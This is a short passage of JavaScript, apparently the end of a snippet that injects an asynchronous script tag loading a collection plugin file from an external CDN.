			'type': 'text/javascript',
			'async': true,
			'src': 'http://utils.cdn.xihuanba.com/Js/CollectionPlugin.Auto.js'
		}), firstObject);
	}

	})();
}
